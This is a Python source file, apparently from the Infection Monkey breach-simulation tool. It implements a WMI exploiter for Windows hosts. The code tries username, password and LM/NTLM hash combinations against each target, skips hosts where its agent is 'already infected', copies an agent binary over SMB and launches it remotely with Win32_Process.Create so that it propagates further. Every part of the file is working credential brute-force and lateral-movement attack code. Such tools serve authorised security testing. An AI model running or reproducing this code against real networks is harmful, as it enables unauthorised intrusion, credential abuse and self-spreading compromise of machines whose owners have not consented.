import logging
import ntpath
import socket
import traceback
from typing import List

from impacket.dcerpc.v5.rpcrt import DCERPCException

from common.utils.exploit_enum import ExploitType
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.tools.helpers import get_monkey_depth, get_target_monkey
from infection_monkey.exploit.tools.smb_tools import SmbTools
from infection_monkey.exploit.tools.wmi_tools import AccessDeniedException, WmiTools
from infection_monkey.model import DROPPER_CMDLINE_WINDOWS, MONKEY_CMDLINE_WINDOWS
from infection_monkey.utils.commands import build_monkey_commandline

logger = logging.getLogger(__name__)


class WmiExploiter(HostExploiter):
    _TARGET_OS_TYPE = ["windows"]
    EXPLOIT_TYPE = ExploitType.BRUTE_FORCE
    _EXPLOITED_SERVICE = "WMI (Windows Management Instrumentation)"

    def __init__(self, host):
        super(WmiExploiter, self).__init__(host)

    @WmiTools.dcom_wrap
    def _exploit_host(self):

        creds = self._config.get_exploit_user_password_or_hash_product()

        for user, password, lm_hash, ntlm_hash in creds:
            creds_for_log = _get_credential_string([user, password, lm_hash, ntlm_hash])
            logger.debug(f"Attempting to connect to {self.host} using WMI with {creds_for_log}")

            wmi_connection = WmiTools.WmiConnection()

            try:
                wmi_connection.connect(self.host, user, password, None, lm_hash, ntlm_hash)
            except AccessDeniedException:
                self.report_login_attempt(False, user, password, lm_hash, ntlm_hash)
                logger.debug(f"Failed connecting to {self.host} using WMI")
                continue
            except DCERPCException:
                self.report_login_attempt(False, user, password, lm_hash, ntlm_hash)
                logger.debug(f"Failed connecting to {self.host} using WMI")
                continue

            except socket.error:
                logger.debug(f"Network error in WMI connection to {self.host}")
                return False

            except Exception as exc:
                logger.debug(
                    f"Unknown WMI connection error to {self.host}: "
                    f"{exc} {traceback.format_exc()}"
                )
                return False

            self.report_login_attempt(True, user, password, lm_hash, ntlm_hash)

            # query process list and check if monkey already running on victim
            process_list = WmiTools.list_object(
                wmi_connection,
                "Win32_Process",
                fields=("Caption",),
                where="Name='{0}'".format(self.options["dropper_target_path_win_64"]),
            )
            if process_list:
                wmi_connection.close()

                logger.debug("Skipping %r - already infected", self.host)
                return False

            downloaded_agent = self.agent_repository.get_agent_binary(self.host.os["type"])

            remote_full_path = SmbTools.copy_file(
                self.host,
                downloaded_agent,
                self.options["dropper_target_path_win_64"],
                user,
                password,
                lm_hash,
                ntlm_hash,
                self._config.smb_download_timeout,
            )

            if not remote_full_path:
                wmi_connection.close()
                return False
            # execute the remote dropper in case the path isn't final
            elif remote_full_path.lower() != self._config.dropper_target_path_win_32.lower():
                cmdline = DROPPER_CMDLINE_WINDOWS % {
                    "dropper_path": remote_full_path
                } + build_monkey_commandline(
                    self.host,
                    get_monkey_depth() - 1,
                    self._config.dropper_target_path_win_32,
                )
            else:
                cmdline = MONKEY_CMDLINE_WINDOWS % {
                    "monkey_path": remote_full_path
                } + build_monkey_commandline(self.host, get_monkey_depth() - 1)

            # execute the remote monkey
            result = WmiTools.get_object(wmi_connection, "Win32_Process").Create(
                cmdline, ntpath.split(remote_full_path)[0], None
            )

            if (0 != result.ProcessId) and (not result.ReturnValue):
                logger.info(
                    "Executed dropper '%s' on remote victim %r (pid=%d, cmdline=%r)",
                    remote_full_path,
                    self.host,
                    result.ProcessId,
                    cmdline,
                )

                self.add_vuln_port(port="unknown")
                success = True
            else:
                logger.debug(
                    "Error executing dropper '%s' on remote victim %r (pid=%d, exit_code=%d, "
                    "cmdline=%r)",
                    remote_full_path,
                    self.host,
                    result.ProcessId,
                    result.ReturnValue,
                    cmdline,
                )
                success = False

            result.RemRelease()
            wmi_connection.close()
            self.add_executed_cmd(cmdline)
            return success

        return False


def _get_credential_string(creds: List) -> str:
    cred_strs = [
        (creds[0], "username"),
        (creds[1], "password"),
        (creds[2], "lm hash"),
        (creds[3], "nt hash"),
    ]

    present_creds = [cred[1] for cred in cred_strs if cred[0]]
    return ", ".join(present_creds)
